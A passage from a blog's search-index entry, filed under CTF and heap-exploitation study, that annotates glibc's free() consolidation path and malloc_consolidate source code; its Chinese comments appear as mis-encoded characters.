class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c">    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br><span class="hljs-comment">//å‘ä¸‹åˆå¹¶</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = p-&gt;prev_size;<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      unlink(av, p, bck, fwd);<br>    &#125;<br><br><span class="hljs-comment">//ä¸Šé¢ä¸æ˜¯top chunk</span><br>    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">/* get and clear inuse bit */</span><br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>      <span class="hljs-comment">/* consolidate forward */</span><br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<span class="hljs-comment">//å‘ä¸Šåˆå¹¶</span><br>unlink(av, nextchunk, bck, fwd);<br>size += nextsize;<br>      &#125; <span class="hljs-keyword">else</span><br>clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//æ”¾å…¥unsorted bin</span><br><br>      bck = unsorted_chunks(av);<br>      fwd = bck-&gt;fd;<br><span class="hljs-comment">//æ£€æŸ¥unsorted binç¬¬ä¸€ä¸ªchunkçš„è¿æ¥æ˜¯å¦æ­£ç¡®</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>&#123;<br>  errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>  <span class="hljs-keyword">goto</span> errout;<br>&#125;<br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<br>&#123;<br>  p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>  p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>&#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br><br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<br><br>      check_free_chunk(av, p);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">      consolidate into top</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//å¦‚æœä¸Šä¸€ä¸ªæ˜¯top chunkï¼Œå’Œtop chunkåˆå¹¶</span><br>      size += nextsize;<br>      set_head(p, size | PREV_INUSE);<br>      av-&gt;top = p;<br>      check_chunk(av, p);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="åç»­æ“ä½œ"><a href="#åç»­æ“ä½œ" class="headerlink" title="åç»­æ“ä½œ"></a>åç»­æ“ä½œ</h4><p>åˆå¹¶åå¦‚æœchunkè¶…è¿‡äº†FASTBIN_CONSOLIDATION_THRESHOLDï¼Œæ•´ç†fast bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>      <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>malloc_consolidate(av);<br><br><span class="hljs-comment">//ä»¥ä¸‹ä¸ºè¿”å›å†…å­˜æ“ä½œ</span><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>  systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">   large, because the corresponding heap might go away.  */</span><br>heap_info *heap = heap_for_ptr(top(av));<br><br>assert(heap-&gt;ar_ptr == av);<br>heap_trim(heap, mp_.top_pad);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      assert (locked);<br>      (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If the chunk was allocated via mmap, release via munmap().</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">else</span> &#123;<br>    munmap_chunk (p);<br>  &#125;<br></code></pre></td></tr></table></figure><h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span><br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-type">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>  <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br>    clear_fastchunks(av);<br><span class="hljs-comment">//æ¸…æ¥šav-&gt;flagsæœ‰å…³fast binçš„æ ‡å¿—ä½ï¼Œè¡¨ç¤ºfast binä¸ºç©º</span><br><br>    unsorted_bin = unsorted_chunks(av);<br><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;<br>      p = atomic_exchange_acq (fb, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">do</span> &#123;<br>  check_inuse_chunk(av, p);<br>  nextp = p-&gt;fd;<br><br>  <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);<br>  nextchunk = chunk_at_offset(p, size);<br>  nextsize = chunksize(nextchunk);<br><br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>    prevsize = p-&gt;prev_size;<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>    unlink(av, p, bck, fwd);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>      size += nextsize;<br>      unlink(av, nextchunk, bck, fwd);<br>    &#125; <span class="hljs-keyword">else</span><br>      clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>    first_unsorted = unsorted_bin-&gt;fd;<br>    unsorted_bin-&gt;fd = p;<br>    first_unsorted-&gt;bk = p;<br><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>      p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>      p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    set_head(p, size | PREV_INUSE);<br>    p-&gt;bk = unsorted_bin;<br>    p-&gt;fd = first_unsorted;<br>    set_foot(p, size);<br>  &#125;<br><br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>  &#125;<br><br>&#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br><br>      &#125;<br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br><span class="hljs-comment">//éå†fastbinçš„æ¯ä¸€æ¡é“¾å’Œæ¯ä¸€ä¸ªchunkï¼Œåˆå¹¶æ•´ç†åŒä¸Š</span><br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<span class="hljs-comment">//å¦‚æœmax_fast==0ï¼Œåˆ™åˆå§‹åŒ–av</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>source code</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
